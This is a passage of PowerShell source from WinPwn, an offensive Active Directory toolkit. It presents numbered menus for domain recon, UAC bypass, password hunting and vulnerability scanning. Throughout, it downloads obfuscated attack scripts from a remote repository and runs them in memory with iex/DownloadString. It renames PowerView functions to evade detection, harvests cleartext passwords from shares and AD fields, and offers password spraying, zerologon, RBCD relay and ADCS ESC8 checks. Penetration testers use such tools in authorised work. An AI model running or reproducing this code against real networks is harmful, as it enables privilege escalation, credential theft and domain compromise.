             1{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsuacmagic.ps1'); uacmagic -BinPath $command}
             2{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsuaccmstp.ps1');uaccmstp -BinFile $command}
             3{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsdiskcleanupuac.ps1');DiskCleanupBypass -command $command}
             4{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsdccuac.ps1')}
       }
    }
  While ($masterquestion -ne 5)

}

function Passhunt
{
  #
        .DESCRIPTION
        Search for hashed or cleartext passwords on the local system or on the domain using Dionachs passhunt.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #LocalDomain Recon  Privesc
    [CmdletBinding()]

    Param
    (
        [bool]
        $local,

        [bool]
        $domain,
        
        [Switch]
        $noninteractive
    )
    pathcheck
    $currentPath = (Get-Item -Path . -Verbose).FullName
    
        if ($domain)
        {
            if (!(Test-Path($currentPathDomainReconWindows_Servers.txt)))
            {
                Searchservers
            }

            if (!(Test-Path($currentPathDomainReconfound_shares.txt)))
            {
                IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsviewobfs.ps1')
                Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
                brainstorm -ComputerFile $currentPathDomainReconWindows_Servers.txt -NoPing -CheckShareAccess  Out-File -Encoding ascii $currentPathDomainReconfound_shares.txt
                 
                $shares = Get-Content $currentPathDomainReconfound_shares.txt
                $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
                $testShares  $currentPathDomainReconfound_shares.txt
            }
            else
            {
                $testShares = Get-Content -Path $currentPathDomainReconfound_shares.txt
            }
            Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
		if (!(test-path $currentPathpasshunt.exe))
		{
			if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
			{
				Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFilespasshunt.exe' -Outfile $currentPathpasshunt.exe
			}
			else
			{
				Invoke-WebRequest -Uri $S3cur3Th1sSh1t_repoCredsmasterexeFilespasshunt.exe -Outfile $currentPathpasshunt.exe
			}
		}
		foreach ($line in $testShares)
                {
                    cmd c start powershell -Command $currentPathpasshunt.exe -s $line -r '(passwordpasswortpasswd -p  -p= -pw 
        -pw=pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
      g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;
                } 
       }
        if ($local)
        {
            if (!(test-path $currentPathpasshunt.exe))
			{
				if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
				{
					Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFilespasshunt.exe' -Outfile $currentPathpasshunt.exe
				}
				else
				{
					Invoke-WebRequest -Uri $S3cur3Th1sSh1t_repoCredsmasterexeFilespasshunt.exe -Outfile $currentPathpasshunt.exe
				}
			}
            
            cmd c start powershell -Command $currentPathpasshunt.exe
            $sharepasshunt = yes
            if (!$noninteractive){$sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares'}
            if ($sharepasshunt -eq yes -or $sharepasshunt -eq y -or $sharepasshunt -eq Yes -or $sharepasshunt -eq Y)
            {
                $shares = (Get-PSDrive -PSProvider FileSystem).Root
                    
                foreach ($line in $shares)
                {
                    cmd c start powershell -Command $currentPathpasshunt.exe -s $line -r '(passwordpasswortpasswd -p  -p= -pw 
          -pw=pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;
                } 
                                  
            }
        }
        else
        {
            if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
			{
				Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFilespasshunt.exe' -Outfile $currentPathpasshunt.exe
			}
			else
			{
				Invoke-WebRequest -Uri $S3cur3Th1sSh1t_repoCredsmasterexeFilespasshunt.exe -Outfile $currentPathpasshunt.exe
			}
            cmd c start powershell -Command $currentPathpasshunt.exe -r '(passwordpasswortpasswd -p  -p= -pw 
      -pw=pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
    g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;
        }

}

function Searchservers
{
    pathcheck
    $currentPath = (Get-Item -Path . -Verbose).FullName

    # P0werspl0its p0werview obfuscated + string replaced
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsviewdevobfs.ps1')
    Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
    $ActiveServers = breviaries -Ping -OperatingSystem Windows Server
    $ActiveServers.dnshostname  $currentPathDomainReconWindows_Servers.txt

}


function Domainreconmodules
{
  #
        .DESCRIPTION
        All domain recon scripts are executed here.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Domain  Network Recon
        [CmdletBinding()]

    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
         
      
                 
       
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    
    @'

             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _

   -- Domainreconmodules @S3cur3Th1sSh1t

'@
    if ($noninteractive -and (!$consoleoutput))
    {
        reconAD
        generaldomaininfo -noninteractive 
        sharphound -noninteractive 
        IEX($viewdevobfs)
        Find-InterestingDomainShareFile  $currentPathDomainReconInterestingDomainshares.txt
        shareenumeration
        powerSQL -noninteractive
        MS17-10 -noninteractive
        zerologon -noninteractive
        passhunt -domain $true
        GPOAudit
        spoolvulnscan -noninteractive
        bluekeep -noninteractive
        printercheck -noninteractive
        RBCD-Check -noninteractive
        GPORemoteAccessPolicy -noninteractive
      Snaffler -noninteractive
        return;
    }
    elseif($noninteractive -and $consoleoutput)
    {
        generaldomaininfo -noninteractive -consoleoutput
        IEX($viewdevobfs)
        Find-InterestingDomainShareFile
        shareenumeration -consoleoutput
        powerSQL -noninteractive -consoleoutput
        MS17-10 -noninteractive -consoleoutput
        zerologon -noninteractive -consoleoutput
        spoolvulnscan -noninteractive -consoleoutput
        bluekeep -noninteractive -consoleoutput
        printercheck -noninteractive -consoleoutput
        RBCD-Check -noninteractive -consoleoutput
        GPORemoteAccessPolicy -noninteractive -consoleoutput
      Snaffler -noninteractive -consoleoutput
        return;
    }
    
    do
    {
        Write-Host ================ WinPwn ================
        Write-Host -ForegroundColor Green '1. Collect general domain information!'
        Write-Host -ForegroundColor Green '2. ADRecon Report! '
        Write-Host -ForegroundColor Green '3. Collect Bloodhound information! '
        Write-Host -ForegroundColor Green '4. Search for potential sensitive domain share files! '
        Write-Host -ForegroundColor Green '5. Find some network shares without predefined filter! '
        Write-Host -ForegroundColor Green '6. Starting ACLAnalysis for Shadow Admin detection! '
        Write-Host -ForegroundColor Green '7. Start MS-RPRN RPC Service Scan! '
        Write-Host -ForegroundColor Green '8. Start PowerUpSQL Checks!'
        Write-Host -ForegroundColor Green '9. Search for MS17-10 vulnerable Windows Servers in the domain! '
        Write-Host -ForegroundColor Green '10. Check Domain Network-Shares for cleartext passwords! '
        Write-Host -ForegroundColor Green '11. Check domain Group policies for common misconfigurations using Grouper2! '
        Write-Host -ForegroundColor Green '12. Search for bluekeep vulnerable Windows Systems in the domain! '
        Write-Host -ForegroundColor Green '13. Search for potential vulnerable web apps (low hanging fruits)! '
        Write-Host -ForegroundColor Green '14. Check remote system groups via GPO Mapping! '
        Write-Host -ForegroundColor Green '15. Search for Systems with Admin-Access to pwn them! '
    Write-Host -ForegroundColor Green '16. Search for printers  potential vulns! '
    Write-Host -ForegroundColor Green '17. Search for Resource-Based Constrained Delegation attack paths! '
    Write-Host -ForegroundColor Green '18. Enumerate remote access policies through group policy! '
        Write-Host -ForegroundColor Green '19. Check all DCs for zerologon vulnerability! '
    Write-Host -ForegroundColor Green '20. Check users for empty passwords! '
    Write-Host -ForegroundColor Green '21. Check username=password combinations! '
        Write-Host -ForegroundColor Green '22. Get network interface IPs of all domain systems via IOXIDResolver! '
        Write-Host -ForegroundColor Green '23. Get the ADCS server(s) and templates + ESC8 Check! '
        Write-Host -ForegroundColor Green '24. Search for vulnerable Domain Systems - RBCD via Petitpotam + LDAP relay!'
        Write-Host -ForegroundColor Green '25. Check the ADCS Templates for Privilege Escalation vulnerabilities via Certify!'
        Write-Host -ForegroundColor Green '26. Enumerate ADCS Template informations and permissions via Certify!'
        Write-Host -ForegroundColor Green '27. Check LDAPLDAPS Signing and or Channel Binding'
        Write-Host -ForegroundColor Green '28. Go back '
        Write-Host ================ WinPwn ================
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master'

        Switch ($masterquestion) 
        {
             1{generaldomaininfo}
             2{reconAD}
             3{SharpHoundMenu}
             4{IEX($viewdevobfs)
             Find-InterestingDomainShareFile  $currentPathDomainReconInterestingDomainshares.txt}
             5{shareenumeration}
             6{invoke-expression 'cmd c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''$S3cur3Th1sSh1t_repoACLightmasterACLight2ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files'';mv CResults .DomainRecon;}'}
             7{spoolvulnscan}
             8{powerSQL}
             9{MS17-10}
             10{domainshares}
             11{GPOAudit}
             12{bluekeep}
             13{fruit}
             14{groupsearch}
             15{latmov}
       16{printercheck}
       17{RBCD-Check}
       18{GPORemoteAccessPolicy}
         19{zerologon}
      20{Domainpassspray -emptypasswords}
      21{Domainpassspray -usernameaspassword}
         22{Oxidresolver}
         23{ADCSInfos}
         24{Invoke-RBDC-over-DAVRPC}
         25{Invoke-VulnerableADCSTemplates}
         26{Invoke-ADCSTemplateRecon}
         27{LDAPChecksMenu}
       }
    }
  While ($masterquestion -ne 28)
}

function LDAPChecksMenu
{
        do
        {
       @'
             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _
   -- LDAP Checks
'@
            Write-Host ================ WinPwn ================
            Write-Host -ForegroundColor Green 1. @klezVirus's SharpLdapRelayScan (requires usernamepassword)! 
            Write-Host -ForegroundColor Green 2. @cube0x0's LdapSignCheck ! 
            Write-Host -ForegroundColor Green '3. Go back '
            Write-Host ================ WinPwn ================
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
            
            Switch ($masterquestion) 
            {
                1{SharpLdapRelayScan}
                2{LdapSignCheck}
             }
        }
        While ($masterquestion -ne 3)


}

function SharpLdapRelayScan
{
# Credit to httpsgithub.comklezVirusSharpLdapRelayScan

    Param
    (   
        [Switch]
        $consoleoutput,
        [String]
        $username,
        [String]
        $password
    )
    if(!$consoleoutput){pathcheck}

    if([string]IsNullOrEmpty($username))
    {
        $username = Read-Host -Prompt 'Please enter a valid username'
    }
    if([string]IsNullOrEmpty($password))
    {
        $password = Read-Host -Prompt 'Please enter a valid password'
    }

    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpLdapRelayScan.ps1')
    if(!$consoleoutput){Invoke-SharpLdapRelayScan -Command -u $username -p $password  $currentPathDomainReconLDAPSigningInfos.txt}else{Invoke-SharpLdapRelayScan -Command -u $username -p $password}


}

function LdapSignCheck
{

# Credit to httpsgithub.comcube0x0LdapSignCheck

    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}

    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-LdapSignCheck.ps1')
    if(!$consoleoutput){Invoke-LdapSignCheck -command   $currentPathDomainReconLDAPSigningInfos.txt}else{Invoke-LdapSignCheck -command }

}

function Invoke-ADCSTemplateRecon
{
    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}

    $currentPath = (Get-Item -Path . -Verbose).FullName
    IEX($Certify)

    Write-Host -ForegroundColor Yellow Collecting general CAADCS informations!
    if(!$consoleoutput){Invoke-Certify cas  $currentPathDomainReconADCS_Infos.txt}else{Invoke-Certify cas}

    Write-Host -ForegroundColor Yellow Checking enrolleeSuppliesSubject templates!
    if(!$consoleoutput){Invoke-Certify find enrolleeSuppliesSubject  $currentPathDomainReconADCS_enrolleeSuppliesSubject.txt}else{Invoke-Certify find enrolleeSuppliesSubject}

    Write-Host -ForegroundColor Yellow Checking templates with Client authentication enabled!
    if(!$consoleoutput){Invoke-Certify find clientauth  $currentPathDomainReconADCS_ClientAuthTemplates.txt}else{Invoke-Certify find clientauth}

    Write-Host -ForegroundColor Yellow Checking all templates permissions!
    if(!$consoleoutput){Invoke-Certify find showAllPermissions  $currentPathDomainReconADCS_Template_AllPermissions.txt}else{Invoke-Certify find showAllPermissions}

    Write-Host -ForegroundColor Yellow Enumerate access control information for PKI objects!
    if(!$consoleoutput){Invoke-Certify pkiobjects  $currentPathDomainReconADCS_Template_AllPermissions.txt}else{Invoke-Certify pkiobjects}


    Write-Host -ForegroundColor Yellow You should check the privilegesgroups for enrollment and or for modification rights!

}

function Invoke-VulnerableADCSTemplates
{

    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}

    $currentPath = (Get-Item -Path . -Verbose).FullName

    IEX($Certify)
    if(!$consoleoutput){Invoke-Certify find vulnerable  $currentPathVulnerabilitiesADCSVulnerableTemplates.txt}else{Invoke-Certify find vulnerable}

}

function generaldomaininfo{
    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    
     #Search for AD-Passwords in description fields
    Write-Host -ForegroundColor Yellow '-------  Searching for passwords in active directory description fields..'
    
    iex ($admodule)            
    
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsadpass.ps1')

    if(!$consoleoutput){thyme  $currentPathDomainReconPasswords_in_description.txt}else{Write-Host -ForegroundColor Yellow '-------  Passwords in description fields';thyme}

    
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsview.ps1')
    $domain_Name = skulked
    $Domain = $domain_Name.Name

    Write-Host -ForegroundColor Yellow '------- Starting Domain Recon phase'

    Write-Host -ForegroundColor Yellow 'Creating Domain User-List'
    
    Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems'
    if(!$consoleoutput){inset  $currentPathDomainReconExploitableSystems.txt}else{inset}

    #P0werview functions, string replaced version
    Write-Host -ForegroundColor Yellow '-------  All those PowerView Network Skripts for later Lookup getting executed and saved'
  if(!$consoleoutput){	
    try{
            skulked  $currentPathDomainReconNetDomain.txt
            televisions  $currentPathDomainReconNetForest.txt
            misdirects  $currentPathDomainReconNetForestDomain.txt      
            odometer  $currentPathDomainReconNetDomainController.txt  
            Houyhnhnm  $currentPathDomainReconNetUser.txt    
            Randal  $currentPathDomainReconNetSystems.txt
          Get-Printer  $currentPathDomainReconlocalPrinter.txt
            damsels  $currentPathDomainReconNetOU.txt    
            xylophone  $currentPathDomainReconNetSite.txt  
            ignominies  $currentPathDomainReconNetSubnet.txt
            reapportioned  $currentPathDomainReconNetGroup.txt 
            confessedly  $currentPathDomainReconNetGroupMember.txt   
            aqueduct  $currentPathDomainReconNetFileServer.txt 
            marinated  $currentPathDomainReconDFSshare.txt 
            liberation  $currentPathDomainReconNetShare.txt 
            cherubs  $currentPathDomainReconNetLoggedon
            Trojans  $currentPathDomainReconDomaintrusts.txt
            sequined  $currentPathDomainReconForestTrust.txt
            ringer  $currentPathDomainReconForeignUser.txt
            condor  $currentPathDomainReconForeignGroup.txt
        }catch{Write-Host Got an error}
        }
        else
        {
            try{
            Write-Host -ForegroundColor Yellow '-------  NetDomain'
            skulked
            Write-Host -ForegroundColor Yellow '-------  NetForest' 
            televisions
            Write-Host -ForegroundColor Yellow '-------  NetForestDomain'
            misdirects       
            Write-Host -ForegroundColor Yellow '-------  NetDomainController'
            odometer  
            Write-Host -ForegroundColor Yellow '-------  NetUser'
            Houyhnhnm     
            Write-Host -ForegroundColor Yellow '-------  NetSystems'
            Randal 
            Write-Host -ForegroundColor Yellow '-------  LocalPrinter'
          Get-Printer
            Write-Host -ForegroundColor Yellow '-------  NetOU'
            damsels
            Write-Host -ForegroundColor Yellow '-------  NetSite'     
            xylophone  
            Write-Host -ForegroundColor Yellow '-------  NetSubnet'
            ignominies 
            Write-Host -ForegroundColor Yellow '-------  NetGroup'
            reapportioned  
            Write-Host -ForegroundColor Yellow '-------  NetGroupMember'
            confessedly   
            Write-Host -ForegroundColor Yellow '-------  NetFileServer'
            aqueduct  
            Write-Host -ForegroundColor Yellow '-------  DFSShare'
            marinated  
            Write-Host -ForegroundColor Yellow '-------  NetShare'
            liberation  
            Write-Host -ForegroundColor Yellow '-------  NetLoggedon'
            cherubs 
            Write-Host -ForegroundColor Yellow '-------  DomainTrust'
            Trojans 
            Write-Host -ForegroundColor Yellow '-------  ForestTrust'
            sequined 
            Write-Host -ForegroundColor Yellow '-------  ForeigUser'
            ringer 
            Write-Host -ForegroundColor Yellow '-------  ForeignGroup'
            condor 
        }catch{Write-Host Got an error}
        }
  IEX ($viewdevobfs)
    if(!$consoleoutput){breviaries -Printers  $currentPathDomainReconDomainPrinters.txt}else{Write-Host -ForegroundColor Yellow -------  DomainPrinters;breviaries -Printers} 	        
  IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsSPN-Scan.ps1')
  if(!$consoleoutput){Discover-PSInterestingServices  $currentPathDomainReconSPNScan_InterestingServices.txt}else{Write-Host -ForegroundColor Yellow -------  InterestingSPNs;Discover-PSInterestingServices}
    
	    
    if(!$consoleoutput){Get-ADUser -Filter {UserAccountControl -band 0x0020}  $currentPathVulnerabilitiesUsersWithoutPasswordPolicy.txt}else{Write-Host -ForegroundColor Yellow '-------  Users without password policy';Get-ADUser -Filter {UserAccountControl -band 0x0020}}

# Dictionary to hold superclass names
$superClass = @{}

# List to hold class names that inherit from container and are allowed to live under computer object
$vulnerableSchemas = [System.Collections.Generic.List[string]]new()

# Resolve schema naming context
$schemaNC = (Get-ADRootDSE).schemaNamingContext

# Enumerate all class schemas
$classSchemas = Get-ADObject -LDAPFilter '(objectClass=classSchema)' -SearchBase $schemaNC -Properties lDAPDisplayName,subClassOf,possSuperiors

# Enumerate all class schemas that computer is allowed to contain
$computerInferiors = $classSchemas Where-Object possSuperiors -eq 'computer'

# Populate superclass table
$classSchemas ForEach-Object {
    $superClass[$_.lDAPDisplayName] = $_.subClassOf
}

# Resolve class inheritance for computer inferiors
$computerInferiors ForEach-Object {
  $class = $cursor = $_.lDAPDisplayName
  while($superClass[$cursor] -notin 'top'){
    if($superClass[$cursor] -eq 'container'){
      $vulnerableSchemas.Add($class)
      break
    }
    $cursor = $superClass[$cursor]
  }
}

# Outpupt list of vulnerable class schemas 
$vulnerableSchemas
if(!$consoleoutput){$vulnerableSchemas  $currentPathVulnerabilitiesVulnerableSchemas.txt}else{Write-Host -ForegroundColor Yellow '-------  Found vulnerable old Exchange Schema (httpstwitter.comtiraniddostatus1420754900984631308)';$vulnerableSchemas}

    Write-Host -ForegroundColor Yellow '------- Searching for Users without password Change for a long time'
  $Date = (Get-Date).AddYears(-1).ToFileTime()
    if(!$consoleoutput){prostituted -LDAPFilter (pwdlastset=$Date) -Properties samaccountname,pwdlastset  $currentPathDomainReconUsers_Nochangedpassword.txt}else{prostituted -LDAPFilter (pwdlastset=$Date) -Properties samaccountname,pwdlastset}
	
    if(!$consoleoutput){
      prostituted -LDAPFilter (!userAccountControl1.2.840.113556.1.4.803=2) -Properties distinguishedname  $currentPathDomainReconEnabled_Users1.txt
        prostituted -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname  $currentPathDomainReconEnabled_Users2.txt
  }
    else
    {
        Write-Host -ForegroundColor Yellow '------- Enabled Users'
        prostituted -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
    }
    Write-Host -ForegroundColor Yellow '------- Searching for Unconstrained delegation Systems and Users'
  if(!$consoleoutput){
    $Computers = breviaries -Unconstrained -Properties DnsHostName  $currentPathDomainReconUnconstrained_Delegation_Systems.txt
    $Users = prostituted -AllowDelegation -AdminCount  $currentPathDomainReconAllowDelegationUsers.txt
    $Users.samaccountname  $currentPathDomainReconAllowDelegationUsers_samaccountnames_only.txt     
    }
    else
    {
        Write-Host -ForegroundColor Yellow '------- Unconstrained delegation Systems'
        $Computers = breviaries -Unconstrained -Properties DnsHostName
        Write-Host -ForegroundColor Yellow '------- Unconstrained delegation Users'
        $Users = prostituted -AllowDelegation -AdminCount
        $Users.samaccountname
    }
    Write-Host -ForegroundColor Yellow '------- Identify kerberos and password policy..'
  $DomainPolicy = forsakes -Policy Domain
    if(!$consoleoutput){
    $DomainPolicy.KerberosPolicy  $currentPathDomainReconKerberospolicy.txt
    $DomainPolicy.SystemAccess  $currentPathDomainReconPasswordpolicy.txt
  }
    else
    {
        $DomainPolicy.KerberosPolicy
        $DomainPolicy.SystemAccess
    }
  Write-Host -ForegroundColor Yellow '------- Searching for LAPS Administrators'
    if(!$consoleoutput){lapschecks}else{lapschecks -noninteractive -consoleoutput}
	
    Write-Host -ForegroundColor Yellow '------- Searching for Systems we have RDP access to..'
  if(!$consoleoutput){rewires -LocalGroup RDP -Identity $envUsername -domain $domain   $currentPathDomainReconRDPAccess_Systems.txt}else{rewires -LocalGroup RDP -Identity $envUsername -domain $domain} 
}

function Invoke-RBDC-over-DAVRPC
{
  #
        .DESCRIPTION
        Search in AD for pingable Windows servers and Check if they are vulnerable to RBCD via Petitpotam + relay to ldap.
        httpsgist.github.comgladiatx0r1ffe59031d42c08603a3bde0ff678feb
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Domain Recon
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    IEX ($viewdevobfs)
    $serversystems = yes
    if(!$noninteractive)
    {
        $serversystems = Read-Host -Prompt 'Start DAV RPC Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while) (yesno)'
    }
    if ($serversystems -eq yes -or $serversystems -eq y -or $serversystems -eq Yes -or $serversystems -eq Y)
    {
      if(Test-Path -Path $currentPathDomainReconWindows_Servers.txt)
        {
            Write-Host -ForegroundColor Yellow Found an existing Server list, using this one instead of generating a new one!
            $ActiveServers = Get-Content $currentPathDomainReconWindows_Servers.txt
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem Windows Server
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers  $currentPathDomainReconWindows_Servers.txt}
        }
    foreach ($acserver in $ActiveServers)
        {
      try{
             $path = 
             $path = Get-ChildItem -Path $acserverpipeDAV RPC SERVICE
               if (!($path -eq $null))
               {
                 Write-Host -ForegroundColor Yellow Found vulnerable Server -  + $acserver + . If no LDAP Signing is enforced (default config) you can pwn via httpsgist.github.comgladiatx0r1ffe59031d42c08603a3bde0ff678feb!
                 if(!$consoleoutput){echo $acserver  $currentPathVulnerabilitiesRBCD_Petitpotam_VulnerableServers.txt}else{Write-Host -ForegroundColor Red $acserver + is vulnerable to RBCD via Petitpotam LDAP relay!}
               }
      }catch{}
        }
    }
    else
    {
        if(Test-Path -Path $currentPathDomainReconWindows_Systems.txt)
        {
            Write-Host -ForegroundColor Yellow Found an existing Windows system list, using this one instead of generating a new one!
            $ActiveServers = Get-Content $currentPathDomainReconWindows_Systems.txt
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem Windows
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers  $currentPathDomainReconWindows_Systems.txt}
        }
    foreach ($acserver in $ActiveServers)
        {
      try{
             $path = 
             $path = Get-ChildItem -Path $acserverpipeDAV RPC SERVICE
               if (!($path -eq $null))
               {
                    Write-Host -ForegroundColor Yellow Found vulnerable System -  + $acserver + . If no LDAP Signing is enforced (default config) you can pwn via httpsgist.github.comgladiatx0r1ffe59031d42c08603a3bde0ff678feb!
                    if(!$consoleoutput){echo $acserver  $currentPathVulnerabilitiesRBCD_Petitpotam_VulnerableSystems.txt}else{Write-Host -ForegroundColor Red $acserver + is vulnerable to RBCD via Petitpotam LDAP relay!}
               }
      }catch{}
        }
    }

}

function ADCSInfos
{
    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    iex($admodule)
    $Dom = Get-ADDomain
    Write-Host -ForegroundColor Yellow '------- Searching AD for ADCS Servers'
    $ServerSearch = CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,$Dom
    $Servers = Get-ADObject -Filter 'ObjectClass -eq certificationAuthority' -SearchBase $ServerSearch
    if($consoleoutput){$Servers}else{$Servers  $currentPathDomainReconADCSServer.txt}

    $SearchCertTemplates = CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$Dom
    Write-Host -ForegroundColor Yellow '------- Searching AD for ADCS Templates'
    $CertTemplates = Get-ADObject -Filter 'ObjectClass -eq pKICertificateTemplate' -SearchBase $SearchCertTemplates
    if($consoleoutput){$CertTemplates}else{$CertTemplates  $currentPathDomainReconADCSTemplates.txt}

    Write-Host -ForegroundColor Yellow '------- Searching for the active CA-Server and checking for ESC8 (httpsposts.specterops.iocertified-pre-owned-d95910965cd2)'
    foreach ($Server in $servers.name)
    {
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]GetCurrentDomain().Name
        $FQDN = $Server + . + $Domain
        try
        {
            $Resolve = Resolve-DNSNAme $FQDN
            $IP = $Resolve.IPAddress
            Write-Host -ForegroundColor Yellow $FQDN resolves to $IP
            
            $client = New-Object System.Net.Sockets.TcpClient
            $beginConnect = $client.BeginConnect($FQDN,80,$null,$null)
            Sleep 2
            if($client.Connected)
            {
                Write-Host -ForegroundColor Yellow $FQDN has Port 80 opened, maybe vulnerable!
                if(!$consoleoutput){$FQDN  $currentPathDomainReconADCS_Maybe_ESC8_Vulnerable.txt}
                try
                {
                    $CertURI = http + $FQDN + certsrvcertfnsh.asp 
                    $WebResponse = iwr  -UseDefaultCredentials -MaximumRedirection 1 -uri $CertURI
                    if ($WebResponse.Content -Match Active Directory Certificate Services)
                    {
                        Write-Host -ForegroundColor Red $FQDN serves certificates over HTTP or has only redirects to HTTPS and is therefore ESC8 vulnerable!
                        if(!$consoleoutput){$FQDN  $currentPathVulnerabilitiesADCS_ESC8_Vulnerable.txt}
                    }
                    else
                    {
                        Write-Host -ForegroundColor Yellow $FQDN hosts a Webserver over HTTP but doesn't match the ADCS content, check that manually!
                    }
                }
                catch
                {
                    Write-Host -ForegroundColor Yellow Not able to connect to $CertURI, maybe the current user is not authorized
                }
                $client.Close()

            }
            else
            {
                Write-Host -ForegroundColor Yellow $FQDN has Port 80 closed, still checking 443 as the server can be vulnerable if channel binding is disabled!
                $client = New-Object System.Net.Sockets.TcpClient
                $beginConnect = $client.BeginConnect($FQDN,443,$null,$null)
                Sleep 2
                if($client.Connected)
                {
                    Write-Host -ForegroundColor Yellow $FQDN has Port 443 opened, maybe vulnerable!
                    if(!$consoleoutput){$FQDN  $currentPathDomainReconADCS_Maybe_ESC8_HTTPS_Vulnerable.txt}
                    try
                    {
                        $CertURI = https + $FQDN + certsrvcertfnsh.asp 
                        $WebResponse = iwr  -UseDefaultCredentials -MaximumRedirection 0 -uri $CertURI
                        if ($WebResponse.Content -Match Active Directory Certificate Services)
                        {
                            Write-Host -ForegroundColor Red $FQDN serves certificates over HTTPS and is therefore potentially ESC8 vulnerable!
                            if(!$consoleoutput){$FQDN  $currentPathVulnerabilitiesADCS_ESC8_HTTPS_Vulnerable.txt}
                        }
                        else
                        {
